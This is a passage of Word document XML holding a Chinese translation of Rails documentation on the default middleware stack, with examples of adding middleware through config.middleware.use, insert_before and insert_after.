          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的时候无效。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3BFF0C"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Rack::Lock</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将应用封装成互斥体，所以应用程序一次只能被单个线程调用。只在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_controller_concurrency</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的时候才有效， 这是默认的.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB43FAE"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ActiveSupport::Cache::Strategy::LocalCache</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为基础的内存支持缓存器(memory backed cache). 这个缓存器不是线程安全的，并且只是作为单个线程的临时内存缓存器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CFBEBA0"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Rack::Runtime</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>X-Runtime</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 头部，包括执行请求所用的时间(精确到秒)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="778B24E0"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Rails::Rack::Logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 通知日志请求已经开始。请求完成后，清除所有的日志。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="301297B8"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ActionDispatch::ShowExceptions</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 救回(回收)应用程序返回的异常，如果是本地请求或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.consider_all_requests_local</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的话，还会渲染出漂亮的异常信息页。如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_dispatch.show_exceptions</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>， 抛出的异常会被忽略。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54532883"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ActionDispatch::RequestId</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 产生一个唯一的 X-Request-Id 头部给 response，并启用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionDispatch::Request#uuid</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15460C0C"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ActionDispatch::RemoteIp</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 用于防止IP欺骗攻击。可在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_dispatch.id_spoofing_check</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_dispatch.trusted_proxies</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 进行设置.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B48F5C3"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Rack::Sendfile</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 拦截所有正文(HTTP 正文)用于处理文件的响应(responses)，并将其替换成一个服务器指定的 X-Sendfile 头部(HTTP 头部). 可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_dispatch.x_sendfile_header</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 配置.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="790905AA"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ActionDispatch::Callbacks</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在处理请求之前运行预先准备的回调。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A2B4411"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ActiveRecord::ConnectionAdapters::ConnectionManagement</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在每次请求完成后清除连接，除非 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rack.test</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 键在请求的环境设置中设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18DF1D04"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ActiveRecord::QueryCache</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 缓存请求中产生的 SELECT 查询。如果换成任何 INSERT 或者 UPDATE 则缓存会被清除.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4268D7F4"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ActionDispatch::Cookies</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为请求设置 cookies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B3179A4"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ActionDispatch::Session::CookieStore</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 负责存储cookies中的会话。修改 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_controller.session_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为那些可选值，可以使用其它可选的中间件. 另外，传递给这个中间件的参数可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_controller.session_options</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 配置.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441465CA"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ActionDispatch::Flash</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>flash</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的键值。只有在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_controller.session_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为某个值才会起作用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D91CEB9"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ActionDispatch::ParamsParser</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将请求中的参数解析到 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB46EF7"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Rack::MethodOverride</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:_method]</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 有设置值,那么允许方法被重写。这个中间件支持 PATCH, PUT 和 DELETE 的 HTTP方法类型.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E11D8D0"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ActionDispatch::Head</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将所有 HEAD 请求转换成 GET 请求，然后再处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB790A9" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15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ActionDispatch::BestStandardsSupport</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 启用 “最好的标准支持” 所以IE8能正确的渲染元素.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263568DB"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除了这些常用的中间件，你可以通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.middleware.use</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法添加自己的:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4680"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="443CAAB9" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A045BA5" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1337804940"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.middleware.use Magical::Unicorns</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="666E569E"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这会将 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Magical::Unicorns</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中间件放置到堆栈的尾部。如果你想添加一个中间件到另一个的前面，可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>insert_before</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="72F9DEFF" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="31FDDC51" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1924997229"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.middleware.insert_before ActionDispatch::Head, Magical::Unicorns</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="76ECD917"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当然也有 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>insert_after</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，它将把某个中间件插入到另一个的后面:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="0283DE19" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="77513C51" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1844273375"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.middleware.insert_after ActionDispatch::Head, Magical::Unicorns</w:t>
